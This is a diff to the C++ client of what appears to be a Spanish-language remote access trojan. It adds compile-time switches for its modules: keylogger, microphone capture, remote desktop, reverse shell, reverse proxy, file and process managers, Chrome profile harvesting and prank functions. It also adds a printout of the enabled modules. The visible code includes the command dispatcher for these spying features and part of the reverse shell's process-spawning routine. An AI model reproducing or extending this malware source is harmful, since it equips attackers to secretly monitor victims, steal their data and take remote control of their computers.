@@ -49,9 +49,80 @@ void Cliente::CheckMyMods() {
         << "NO\n";
 #endif
 
+    std::cout << "ADMIN ARCHIVOS: "
+#ifdef __MOD_FM
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "FUN: "
+#ifdef __MOD_F
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "INFO: "
+#ifdef __MOD_INFO
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+    
+    std::cout << "KEYLOGGER: "
+#ifdef __MOD_KEY
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "MICROFONO: "
+#ifdef __MOD_MIC
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "ESCRITORIO REMOTO: "
+#ifdef __MOD_RD
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "PROXY INVERSA: "
+#ifdef __MOD_RP
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "ADMIN VENTANAS: "
+#ifdef __MOD_WM
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "REVERSE SHELL: "
+#ifdef __MOD_SHELL
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
+    std::cout << "ADMIN PROCESOS: "
+#ifdef __MOD_PM
+        << "SI\n";
+#else
+        << "NO\n";
+#endif
+
 }
 
 void Cliente::DestroyClasses() {
+#ifdef __MOD_RD
     if (this->mod_RemoteDesk != nullptr) {
         this->mod_RemoteDesk->DetenerLive();
         DeleteObj<mod_RemoteDesktop>(this->mod_RemoteDesk);
@@ -59,7 +130,9 @@ void Cliente::DestroyClasses() {
             this->mod_dynamic->UnloadRDDlls();
         }
     }
+#endif
 
+#ifdef __MOD_MIC
     if (this->mod_Mic != nullptr) {
         this->mod_Mic->m_DetenerLive();
         DeleteObj<Mod_Mic>(this->mod_Mic);
@@ -67,16 +140,21 @@ void Cliente::DestroyClasses() {
             this->mod_dynamic->UnloadMicProcs();
         }
     }
+#endif
 
+#ifdef __MOD_SHELL
     if (this->reverseSHELL != nullptr) {
         this->reverseSHELL->TerminarShell();
         DeleteObj<ReverseShell>(this->reverseSHELL);
     }
+#endif
 
+#ifdef __MOD_KEY
     if (this->mod_Key != nullptr) {
         this->mod_Key->Stop();
         DeleteObj<mod_Keylogger>(this->mod_Key);
     }
+#endif
 
 #ifdef __MOD_CAM
     if (this->mod_Cam != nullptr) {
@@ -93,25 +171,36 @@ void Cliente::DestroyClasses() {
     }
 #endif
 
+#ifdef __MOD_F
     if (this->mod_Fun) {
         DeleteObj<modFun>(this->mod_Fun);
         if (this->mod_dynamic) {
             this->mod_dynamic->UnloadFunDlls();
         }
     }
+#endif
 
+#ifdef __MOD_INFO
     if (this->mod_Inf0) {
         DeleteObj<mod_Info>(this->mod_Inf0);
         if (this->mod_dynamic) {
             this->mod_dynamic->UnloadInfoProcs();
         }
     }
+#endif
 
+#ifdef __MOD_WM
     DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
+#endif
+
+#ifdef __MOD_RP
     DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
+#endif
+
 #ifdef __MOD_SCAN
     DeleteObj<mod_Escaner>(this->mod_Scan);
 #endif
+ 
     __DBG_("[DC] Clases destruidas");
 }
 
@@ -274,6 +363,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //            TRANSFERENCIA DE ARCHIVOS               # 
+#ifdef __MOD_FM
     if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
         //strIn[0] = id archivo
@@ -336,6 +426,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
+#endif
+
     //Sin uso por ahora
     if (iComando == EnumComandos::PING) {
         __DBG_("[!]PING");
@@ -361,7 +453,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //#        COMANDOS SUBMENU ADMIN ARCHIVOS           #
-
+#ifdef __MOD_FM
     //Listar drives
     if (iComando == EnumComandos::FM_Discos) {
         std::string strDipositivos = strDrivesData();
@@ -495,13 +587,16 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+
+#endif
+
     //#####################################################
 
 
     //#####################################################
     //#####################################################
     //#        COMANDOS SUBMENU ADMIN PROCESOS            #
-
+#ifdef __MOD_PM
     if (iComando == EnumComandos::PM_Refrescar) {
         std::string strProc = strProcessList();
         this->cChunkSend(this->sckSocket, strProc.c_str(), static_cast<int>(strProc.size()), 0, true, nullptr, EnumComandos::PM_Lista);
@@ -515,12 +610,14 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
 
     //#####################################################
 
     //#####################################################
     //#####################################################
     //#                   KEYLOGGER                       #
+#ifdef __MOD_KEY
     if (iComando == EnumComandos::KL_Iniciar) {
         if (this->mod_Key == nullptr) {
             if (!this->mod_dynamic->LoadKLProcs()) {
@@ -539,6 +636,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+
+#endif
+
     //#####################################################
 
 
@@ -680,6 +780,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //                    MIC                             # 
+#ifdef __MOD_MIC
     //Lista de dispositivos de entrada (mic)
     if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
         if (this->mod_Mic == nullptr) {
@@ -719,12 +820,15 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
+
     //#####################################################
 
 
     //#####################################################
     //#####################################################
     //                REVERSE SHELL                       # 
+#ifdef __MOD_SHELL
     //Iniciar shell
     if (iComando == EnumComandos::Reverse_Shell_Start) {
         if (this->reverseSHELL != nullptr) {
@@ -754,12 +858,15 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
+
     //#####################################################
 
 
     //#####################################################
     //#####################################################
     //                ESCRITORIO REMOTO                   # 
+#ifdef __MOD_RD
     //Lista de pantallas
     if (iComando == EnumComandos::RD_Lista) {
         if (!this->mod_RemoteDesk) {
@@ -934,10 +1041,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
 
     //#####################################################
     //#####################################################
     //                ADMIN VENTANAS                      # 
+#ifdef __MOD_WM
     if (iComando == EnumComandos::WM_Lista) {
         if (!this->mod_AdminVen) {
             if (!this->mod_dynamic->LoadWMProcs()) {
@@ -981,11 +1090,13 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             return;
         }
     }
+#endif
 
     //#####################################################
     //#####################################################
     //               RECOLECCION INFO                     # 
     //Enviar lista de perfiles de chrome
+#ifdef __MOD_INFO
     if (iComando == EnumComandos::INF_Chrome_Profiles) {
         if (this->mod_Inf0 == nullptr) {
             if (!this->mod_dynamic->LoadInfoProcs()) {
@@ -1062,10 +1173,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         }
         return;
     }
+#endif
 
     //#####################################################
     //#####################################################
     //               PROXY INVERSA                        # 
+#ifdef __MOD_RP
     //Datos de proxy remoto
     if (iComando == EnumComandos::PROXY_CMD) {
         if (!this->mod_ReverseProxy) {
@@ -1075,6 +1188,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         this->mod_ReverseProxy->m_ProcesarDatosProxy(buffer, static_cast<int>(iRecibido - 1));
         return;
     }
+#endif
 
     //#####################################################
     //#####################################################
@@ -1134,6 +1248,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#####################################################
     //#####################################################
     //               BROMAS                               # 
+#ifdef __MOD_F
     //Mod fun - swap mouse
     if (iComando == EnumComandos::Fun_Swap_Mouse) {
         if (this->mod_Fun == nullptr) {
@@ -1196,6 +1311,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
             this->mod_Fun->m_CD(_open);
             return;
         }
+#endif
 
     //Comando no valido o habilitado
     //__DBG_("[X] Comando no soportado " + paquete.cBuffer);
@@ -1696,6 +1812,7 @@ std::string Cliente::ObtenerDown() {
 
 
 //Reverse shell
+#ifdef __MOD_SHELL
 bool ReverseShell::SpawnShell(const char* pstrComando) {
     if (!cCliente->mod_dynamic->KERNEL32.pGetStartupInfoA || !cCliente->mod_dynamic->KERNEL32.pCreateProcessA || !cCliente->mod_dynamic->KERNEL32.pCreatePipe) {
         __DBG_("[X]SpawnShell no se cargaron las funciones");
@@ -1862,4 +1979,4 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
         }
     }
 }
-
+#endif
